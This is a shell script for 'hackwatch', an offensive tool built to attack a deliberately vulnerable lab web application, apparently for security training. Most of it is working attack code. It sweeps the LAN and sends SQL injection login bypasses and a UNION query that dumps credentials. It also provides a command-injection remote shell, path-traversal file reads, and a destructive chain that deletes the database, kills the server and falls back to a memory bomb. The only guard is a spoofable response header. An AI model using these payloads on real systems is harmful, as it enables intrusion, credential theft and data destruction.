#!/bin/sh
# hackwatch - a wrist-borne attack tool for the hackwatch lab.
#
# It talks to a deliberately vulnerable web application (target/app.py) with
# nothing but curl. On a Wear OS watch running Wear Term it also buzzes the
# wrist, posts notifications and speaks through the wt-* device commands;
# everywhere else those parts simply stay silent.
#
# Safety: every attack subcommand first verifies that the target answers with
# the `X-HackWatch-Lab` header. It refuses to touch anything that is not the
# lab. Read that again before you point it at something.

VERSION="1.0.0"

# --- output ---------------------------------------------------------------

PLAIN="${HACKWATCH_PLAIN:-0}"
if [ "$PLAIN" = "0" ] && { [ "${HACKWATCH_COLOR:-0}" = "1" ] || [ -t 1 ]; }; then
    C_RESET=$(printf '\033[0m')
    C_RED=$(printf '\033[1;31m')
    C_GREEN=$(printf '\033[1;32m')
    C_YELLOW=$(printf '\033[1;33m')
    C_CYAN=$(printf '\033[1;36m')
    C_DIM=$(printf '\033[2m')
else
    C_RESET=; C_RED=; C_GREEN=; C_YELLOW=; C_CYAN=; C_DIM=
fi

if sleep 0.1 2>/dev/null; then PAUSE="sleep 0.15"; else PAUSE="sleep 1"; fi
if sleep 0.02 2>/dev/null; then TYPE_SLEEP="sleep 0.02"; else TYPE_SLEEP=""; fi

die()  { printf '%s\n' "${C_RED}hackwatch: $*${C_RESET}" >&2; exit 1; }
info() { printf '%s\n' "${C_CYAN}::$*${C_RESET}"; }
ok()   { printf '%s\n' "${C_GREEN} $*${C_RESET}"; }
warn() { printf '%s\n' "${C_YELLOW} $*${C_RESET}"; }

# --- wrist ----------------------------------------------------------------

have() { command -v "$1" >/dev/null 2>&1; }

wrist_vibrate() { have wt-vibrate && wt-vibrate -d "${1:-200}" >/dev/null 2>&1 & }
wrist_notify()  { have wt-notify  && wt-notify -t "hackwatch" "$1" >/dev/null 2>&1 & }
wrist_say()     { have wt-tts     && wt-tts "$1" >/dev/null 2>&1 & }

# --- state ----------------------------------------------------------------

TARGET_FILE="${HOME:-${TMPDIR:-/tmp}}/.hackwatch_target"
TMP_BASE="${TMPDIR:-/tmp}"
# mksh (Android's /system/bin/sh) spills heredocs into temp files, and wants an
# absolute TMPDIR for that. Make it absolute and export it for every child.
case "$TMP_BASE" in
    /*) ;;
    *) TMP_BASE=$(cd "$TMP_BASE" 2>/dev/null && pwd) || TMP_BASE="/tmp" ;;
esac
export TMPDIR="$TMP_BASE"
TMP=$(mktemp -d "$TMP_BASE/hackwatch.XXXXXX" 2>/dev/null) \
    || TMP=$(mktemp -d 2>/dev/null) \
    || TMP="$TMP_BASE/hackwatch.$$"
mkdir -p "$TMP" 2>/dev/null || {
    printf '%s\n' "hackwatch: cannot create temp dir under $TMP_BASE" >&2
    exit 1
}
cleanup() { rm -rf "$TMP"; }
trap cleanup EXIT INT TERM

URL=""
URL_EXPLICIT=0
[ -f "$TARGET_FILE" ] && URL=$(cat "$TARGET_FILE" 2>/dev/null)

need_url() { [ -n "$URL" ] || die "no target. run: hackwatch target <url>"; }

# True when $1 answers like the lab.
lab_alive() {
    headers=$(curl -s -m 4 -D - -o /dev/null "$1/" 2>/dev/null || true)
    printf '%s\n' "$headers" | grep -qi '^x-hackwatch-lab: *1'
}

# Our own IPv4, so the sweep knows which /24 to walk.
#
# Order matters: inside the Wear Term app there is no netlink (the sandbox
# denies it), but wt-net knows the address anyway. Everywhere else the
# ip command works.
own_ip() {
    if have wt-net; then
        ip4=$(wt-net 2>/dev/null \
            | sed -n 's/^address=\([0-9][0-9.]*\)$/\1/p' \
            | grep -v '^127\.' | head -1)
        if [ -n "$ip4" ]; then
            printf '%s' "$ip4"
            return 0
        fi
    fi
    ip4=$(ip route get 1.1.1.1 2>/dev/null \
        | sed -n 's/.*src \([0-9][0-9.]*\).*/\1/p' | head -1)
    if [ -z "$ip4" ]; then
        ip4=$(ip -o -4 addr show up 2>/dev/null | grep -v ' 127\.' \
            | sed -n 's/.*inet \([0-9.]*\).*/\1/p' | head -1)
    fi
    printf '%s' "$ip4"
}

# Last resort: no API and no netlink. Ping the usual gateways in parallel;
# whichever answers names the subnet we are standing in.
guess_base() {
    gw="$TMP/gw"
    : > "$gw"
    for base in 192.168.0 192.168.1 192.168.2 192.168.4 192.168.10 \
                192.168.43 10.0.0 172.20.10; do
        (ping -c1 -W1 "$base.1" >/dev/null 2>&1 && echo "$base" >> "$gw") &
    done
    wait
    head -1 "$gw"
}

# One probe: shout into one address, write it down if the lab answers.
probe() { # $1=ip $2=port $3=found-file
    body=$(curl -s -m 1 "http://$1:$2/.well-known/hackwatch" 2>/dev/null || true)
    case "$body" in
        *hackwatch-lab*) printf 'http://%s:%s\n' "$1" "$2" >> "$3" ;;
    esac
}

# Same probe, but answered directly: prints the URL when it is the lab.
check_host() { # $1=ip $2=port
    body=$(curl -s -m 2 "http://$1:$2/.well-known/hackwatch" 2>/dev/null || true)
    case "$body" in
        *hackwatch-lab*) printf 'http://%s:%s\n' "$1" "$2"; return 0 ;;
    esac
    return 1
}

# Walk the local /24 in the background, in batches so the watch survives it.
# Prints the first lab URL found.
sweep() { # $1=base $2=port $3=found-file $4=own-ip
    i=1
    in_flight=0
    while [ "$i" -lt 255 ]; do
        ip="$1.$i"
        if [ "$ip" != "$4" ]; then
            probe "$ip" "$2" "$3" &
            in_flight=$(( in_flight + 1 ))
        fi
        if [ "$in_flight" -ge 64 ]; then
            wait
            in_flight=0
            [ -s "$3" ] && return 0
            printf '.' >&2
        fi
        i=$(( i + 1 ))
    done
    wait
    printf '\n' >&2
    [ -s "$3" ]
}

# Find the lab on this LAN. Prints its URL. Checks an explicit
# $HACKWATCH_TARGET first, then sweeps the local /24 on $HACKWATCH_PORTS.
find_lab() {
    if [ -n "${HACKWATCH_TARGET:-}" ]; then
        base="${HACKWATCH_TARGET%/}"
        case "$base" in
            *:*)
                lab_alive "$base" && { printf '%s\n' "$base"; return 0; } ;;
            *)
                for p in ${HACKWATCH_PORTS:-8000}; do
                    lab_alive "$base:$p" && { printf '%s\n' "$base:$p"; return 0; }
                done ;;
        esac
        return 1
    fi
    ip4=$(own_ip)
    if [ -n "$ip4" ]; then
        base="${ip4%.*}"
    elif [ -n "${HACKWATCH_SUBNET:-}" ]; then
        base="$HACKWATCH_SUBNET"
    else
        base=$(guess_base) || return 1
    fi
    [ -n "$base" ] || return 1
    found="$TMP/find"
    : > "$found"
    for p in ${HACKWATCH_PORTS:-8000}; do
        # Ourselves first: the lab often runs on the machine in your hand.
        hit=$(check_host "$ip4" "$p") \
            || hit=$(check_host "127.0.0.1" "$p") \
            || true
        if [ -n "$hit" ]; then
            printf '%s\n' "$hit"
            return 0
        fi
        if sweep "$base" "$p" "$found" "$ip4"; then
            head -1 "$found"
            return 0
        fi
    done
    return 1
}

label() { # pad a label to the width used by the report lines
    printf '%-16s' "$1"
}

# --- guardrail ------------------------------------------------------------

# Attack commands call this, not need_url: an explicit URL is used as-is,
# a cached URL is rechecked, and with neither the LAN is swept for the lab.
# Whatever wins is written back to the cache.
resolve_target() {
    if [ -n "$URL" ] && [ "$URL_EXPLICIT" = "1" ]; then
        return 0
    fi
    if [ -n "$URL" ] && lab_alive "$URL"; then
        return 0
    fi
    if [ -n "$URL" ]; then
        warn "cached target is dead; scanning LAN..."
    else
        info "no target set; scanning LAN for the lab..."
    fi
    found=$(find_lab) || die "no hackwatch lab on this LAN (start it: python3 target/app.py)"
    URL="$found"
    printf '%s\n' "$URL" > "$TARGET_FILE" 2>/dev/null || true
    ok "target: $URL"
}

ensure_lab() {
    resolve_target
    headers=$(curl -s -m 10 -D - -o /dev/null "$URL/" 2>/dev/null || true)
    printf '%s\n' "$headers" | grep -qi '^x-hackwatch-lab: *1' \
        || die "refusing: $URL is not a hackwatch lab (no X-HackWatch-Lab header)"
}

# --- art ------------------------------------------------------------------

banner() {
    if [ "$PLAIN" = "1" ]; then
        printf 'hackwatch %s\n' "$VERSION"
        return
    fi
    printf '%s' "$C_GREEN"
    cat <<'ART'
#   #   #    #### #   # #   #   #   #####  #### #   #
#   #  # #  #     #  #  #   #  # #    #   #     #   #
##### ##### #     ###   # # # #####   #   #     #####
#   # #   # #     #  #  # # # #   #   #   #     #   #
#   # #   #  #### #   #  # #  #   #   #    #### #   #
ART
    printf '%s' "$C_RESET"
    printf '%s\n' "${C_DIM}  wrist-borne web attack tool  v$VERSION${C_RESET}"
}

target_down() {
    printf '%s' "$C_RED"
    cat <<'ART'

#####   #   ####   #### ##### #####       ####   ###  #   # #   #
  #    # #  #   # #     #       #         #   # #   # #   # ##  #
  #   ##### ####  #  ## ####    #         #   # #   # # # # # # #
  #   #   # #  #  #   # #       #         #   # #   # # # # #  ##
  #   #   # #   #  #### #####   #         ####   ###   # #  #   #
ART
    printf '%s' "$C_RESET"
}

matrix() {
    i=0
    while [ "$i" -lt 10 ]; do
        blob=$(head -c 24 /dev/urandom 2>/dev/null | base64 2>/dev/null \
               | tr -d '\n' | cut -c1-32)
        [ -n "$blob" ] || blob="0x$(date +%s 2>/dev/null | cut -c1-12)"
        printf '%s\n' "${C_GREEN}  ${blob}${C_RESET}"
        i=$(( i + 1 ))
    done
}

# --- cinema -----------------------------------------------------------------

# Typewriter: prints ASCII text character by character. Falls back to a plain
# line when colours are off or the shell cannot sleep fractions of a second.
typeout() { # $1=color $2=text
    color="$1"
    text="$2"
    if [ "$PLAIN" = "1" ] || [ -z "$TYPE_SLEEP" ]; then
        printf '%s%s%s\n' "$color" "$text" "$C_RESET"
        return
    fi
    printf '%s' "$color"
    rest="$text"
    while [ -n "$rest" ]; do
        printf '%s' "$rest" | cut -c1 | tr -d '\n'
        rest=$(printf '%s' "$rest" | cut -c2-)
        $TYPE_SLEEP
    done
    printf '%s\n' "$C_RESET"
}

wait_down() { # seconds; progress on stderr, verdict on stdout
    limit="${1:-15}"
    i=0
    while [ "$i" -lt "$limit" ]; do
        code=$(curl -s -m 4 -o /dev/null -w '%{http_code}' "$URL/" 2>/dev/null || true)
        [ -n "$code" ] || code=000
        if [ "$code" = "000" ]; then
            printf '\n' >&2
            echo down
            return 0
        fi
        printf '\r  %s http %s  ' "${C_DIM}still up:${C_RESET}" "$code" >&2
        i=$(( i + 1 ))
        $PAUSE
    done
    printf '\n' >&2
    echo up
}

# --- commands -------------------------------------------------------------

cmd_help() {
    banner
    cat <<EOF

usage: hackwatch <command> [url] [args]

  target <url>     remember the lab url (so you can skip typing it)
  find             scan the LAN for the lab and remember it
  status           is the lab up?
  recon            fingerprint the target and probe well-known paths
  sqli             bypass the login form with SQL injection
  loot             dump the users table through a UNION injection
  cmdi <cmd>       run a shell command on the target (command injection)
  lfi <path>       read a file off the target (path traversal)
  shell            interactive shell over the command injection
  nuke --yes       wipe the database and kill the server
  auto --yes       full chain: recon, sqli, loot, nuke. no stops.
                   finds the lab itself when no url is given
                   (`hack` runs this: one word, total compromise)
  banner           print the banner
  help             this text

environment:
  HACKWATCH_PLAIN=1   no colours
  HACKWATCH_COLOR=1   force colours when piped
  HACKWATCH_TARGET=u  check this base url first when finding the lab
  HACKWATCH_SUBNET=192.168.1
                      pin the /24 swept by find (default: auto-detect)
  HACKWATCH_PORTS="8000 80"
                      ports swept by find (default: 8000)

Only ever point this at the hackwatch lab. Everything else is refused.
EOF
}

cmd_target() {
    [ $# -gt 0 ] || die "usage: hackwatch target <url>"
    printf '%s\n' "${1%/}" > "$TARGET_FILE"
    ok "target set: $1"
}

cmd_find() {
    info "scanning LAN for the lab..."
    found=$(find_lab) || die "no hackwatch lab on this LAN (start it: python3 target/app.py)"
    printf '%s\n' "$found" > "$TARGET_FILE" 2>/dev/null || true
    URL="$found"
    ok "found and remembered: $found"
}

cmd_status() {
    need_url
    code=$(curl -s -m 8 -o /dev/null -w '%{http_code}' "$URL/" 2>/dev/null || true)
    [ -n "$code" ] || code=000
    if [ "$code" = "000" ]; then
        printf '%s\n' "${C_RED}DOWN${C_RESET}  $URL"
        return 1
    fi
    headers=$(curl -s -m 8 -D - -o /dev/null "$URL/" 2>/dev/null || true)
    lab=no
    printf '%s\n' "$headers" | grep -qi '^x-hackwatch-lab: *1' && lab=yes
    printf '%s\n' "${C_GREEN}UP${C_RESET}    $URL (http $code, lab=$lab)"
}

cmd_recon() {
    need_url
    info "recon $URL"
    headers=$(curl -s -m 10 -D - -o "$TMP/body" "$URL/" 2>/dev/null || true)
    server=$(printf '%s\n' "$headers" | awk -F': ' 'tolower($1)=="server"{print $2; exit}')
    printf '  %s %s\n' "$(label server)" "${server:-unknown}"
    title=$(grep -o '<title>[^<]*</title>' "$TMP/body" 2>/dev/null | sed 's/<[^>]*>//g' | head -1)
    printf '  %s %s\n' "$(label title)" "${title:-none}"
    lab=$(printf '%s\n' "$headers" | grep -i '^x-hackwatch-lab:' | head -1 | sed 's/^[^:]*: *//')
    printf '  %s %s\n' "$(label lab)" "${lab:-absent}"
    printf '  %s\n' "${C_DIM}probing well-known paths...${C_RESET}"
    found=0
    for path in /.env /.git/config /robots.txt /admin '/search?q=recon' /.well-known/hackwatch; do
        code=$(curl -s -m 8 -o "$TMP/one" -w '%{http_code}' "$URL$path" 2>/dev/null || true)
        [ -n "$code" ] || code=000
        if [ "$code" = "200" ]; then
            printf '  %s %-26s (http %s)\n' "${C_GREEN}[FOUND]${C_RESET}" "$path" "$code"
            found=$(( found + 1 ))
            wrist_vibrate 80
        elif [ "$code" = "403" ]; then
            printf '  %s %-26s (http %s)\n' "${C_YELLOW}[DENY ]${C_RESET}" "$path" "$code"
        fi
    done
    if [ "$found" -gt 0 ]; then
        ok "$found interesting path(s)"
        wrist_notify "recon: $found paths exposed"
    else
        warn "nothing obvious"
    fi
}

cmd_sqli() {
    ensure_lab
    info "sql injection on $URL/login"
    i=0
    for payload in "' OR 1=1--" "' OR '1'='1" "admin'--" "' OR 1=1#"; do
        i=$(( i + 1 ))
        printf '  payload %d: %s\n' "$i" "$payload"
        curl -s -m 15 -D "$TMP/h" -o "$TMP/b" \
            --data-urlencode "username=$payload" \
            --data-urlencode "password=x" \
            "$URL/login" >/dev/null 2>&1 || true
        if grep -qi '^x-auth: *granted' "$TMP/h"; then
            role=$(grep -i '^x-role:' "$TMP/h" | head -1 | sed 's/^[^:]*: *//')
            printf '%s\n' "${C_GREEN}  >> ACCESS GRANTED${C_RESET}  role=${role:-?}  payload=$payload"
            wrist_vibrate 300
            wrist_notify "SQLi: ACCESS GRANTED"
            wrist_say "access granted"
            return 0
        fi
    done
    printf '%s\n' "${C_RED}  >> no bypass${C_RESET}"
    return 1
}

cmd_loot() {
    ensure_lab
    info "dumping users via UNION injection"
    curl -s -m 15 --get "$URL/user" \
        --data-urlencode "id=0 UNION SELECT id, username, password, role FROM users" \
        > "$TMP/loot" 2>/dev/null || true
    if ! grep -q 'user=' "$TMP/loot"; then
        warn "nothing dumped (is the database still there?)"
        return 1
    fi
    awk -v hl="$C_YELLOW" -v rs="$C_RESET" \
        '{ line=$0; gsub(/pass=[^ ]*/, hl "&" rs, line); print "  " line }' "$TMP/loot"
    count=$(grep -c 'user=' "$TMP/loot")
    ok "$count account(s) dumped"
    wrist_vibrate 150
    wrist_notify "loot: $count credentials"
}

cmd_cmdi() {
    ensure_lab
    [ $# -gt 0 ] || die "usage: hackwatch cmdi <command>"
    curl -s -m 20 --get "$URL/ping" --data-urlencode "host=127.0.0.1; $*" 2>/dev/null || true
    printf '\n'
}

cmd_lfi() {
    ensure_lab
    [ $# -gt 0 ] || die "usage: hackwatch lfi <path>"
    curl -s -m 15 --get "$URL/download" --data-urlencode "file=$1" 2>/dev/null || true
    printf '\n'
}

cmd_shell() {
    ensure_lab
    info "interactive shell over the /ping command injection"
    printf '  %stype a command, or exit%s\n' "$C_DIM" "$C_RESET"
    while :; do
        printf '%shackwatch>%s ' "$C_GREEN" "$C_RESET"
        IFS= read -r line || break
        case "$line" in
            exit|quit) break ;;
            "") continue ;;
        esac
        curl -s -m 20 --get "$URL/ping" --data-urlencode "host=127.0.0.1; $line" 2>/dev/null || true
    done
    ok "shell closed"
}

cmd_nuke() {
    confirm=0
    for arg in "$@"; do [ "$arg" = "--yes" ] && confirm=1; done
    [ "$confirm" = "1" ] || die "nuke is destructive: re-run with --yes"
    ensure_lab

    banner
    nuke_fire
}

cmd_auto() {
    confirm=0
    for arg in "$@"; do [ "$arg" = "--yes" ] && confirm=1; done
    [ "$confirm" = "1" ] || die "auto ends with nuke: re-run with --yes"
    ensure_lab

    banner
    printf '\n'
    typeout "$C_RED" "TARGET: $URL"
    typeout "$C_RED" "ONE WORD. TOTAL COMPROMISE."
    printf '\n'
    wrist_notify "hack started: $URL"

    info "stage 1/4: mapping the target"
    cmd_recon || return 1
    $PAUSE
    info "stage 2/4: forcing the door"
    cmd_sqli || return 1
    $PAUSE
    info "stage 3/4: taking everything"
    cmd_loot || return 1
    $PAUSE
    info "stage 4/4: dropping the site"
    nuke_fire
}

nuke_fire() {
    typeout "$C_RED" "  TARGET: $URL"
    typeout "$C_RED" "  THIS KILLS THE LAB SERVER."
    printf '\n'

    info "reading /.env for the database path"
    envbody=$(curl -s -m 10 "$URL/.env" 2>/dev/null || true)
    dbpath=$(printf '%s\n' "$envbody" | sed -n 's/^DB_PATH=//p' | head -1)
    if [ -n "$dbpath" ]; then
        printf '  DB_PATH = %s\n' "$dbpath"
    else
        warn "could not read DB_PATH; will skip the wipe"
    fi

    printf '\n'
    i=3
    while [ "$i" -gt 0 ]; do
        printf '%s\n' "  ${C_YELLOW}firing in $i...${C_RESET}"
        wrist_vibrate 120
        $PAUSE
        $PAUSE
        i=$(( i - 1 ))
    done

    matrix

    payload=""
    if [ -n "$dbpath" ]; then payload="rm -f '$dbpath'; "; fi
    payload="${payload}kill -9 \$PPID"

    info "injecting payload"
    printf '  %s%s%s\n' "$C_DIM" "$payload" "$C_RESET"
    curl -s -m 8 --get "$URL/ping" --data-urlencode "host=127.0.0.1; $payload" \
        >/dev/null 2>&1 || true

    state=$(wait_down 15)
    if [ "$state" != "down" ]; then
        warn "RCE did not stop it; falling back to the memory bomb"
        curl -s -m 8 "$URL/boom?mb=999999" >/dev/null 2>&1 || true
        state=$(wait_down 20)
    fi

    printf '\n'
    if [ "$state" = "down" ]; then
        target_down
        wrist_vibrate 900
        wrist_notify "TARGET DOWN: $URL"
        wrist_say "target down"
        return 0
    fi
    printf '%s\n' "${C_RED}  target survived. check the lab manually.${C_RESET}"
    return 1
}

# --- main -----------------------------------------------------------------

main() {
    [ $# -gt 0 ] || { cmd_help; return 0; }

    while [ $# -gt 0 ]; do
        case "$1" in
            --plain) PLAIN=1; C_RESET=; C_RED=; C_GREEN=; C_YELLOW=; C_CYAN=; C_DIM=; shift ;;
            *) break ;;
        esac
    done

    cmd="${1:-help}"
    shift 2>/dev/null || true

    case "$cmd" in
        target|help|banner|find) ;;
        *)
            case "${1:-}" in
                http://*|https://*) URL="${1%/}"; URL_EXPLICIT=1; shift ;;
            esac
            ;;
    esac

    case "$cmd" in
        help|-h|--help) cmd_help ;;
        banner)         banner ;;
        target)         cmd_target "$@" ;;
        find)           cmd_find ;;
        status)         cmd_status ;;
        recon)          cmd_recon ;;
        sqli)           cmd_sqli ;;
        loot)           cmd_loot ;;
        cmdi)           cmd_cmdi "$@" ;;
        lfi)            cmd_lfi "$@" ;;
        shell)          cmd_shell ;;
        nuke)           cmd_nuke "$@" ;;
        auto)           cmd_auto "$@" ;;
        *)              printf '%s\n' "${C_RED}hackwatch: unknown command: $cmd${C_RESET}"; cmd_help; exit 1 ;;
    esac
}

main "$@"
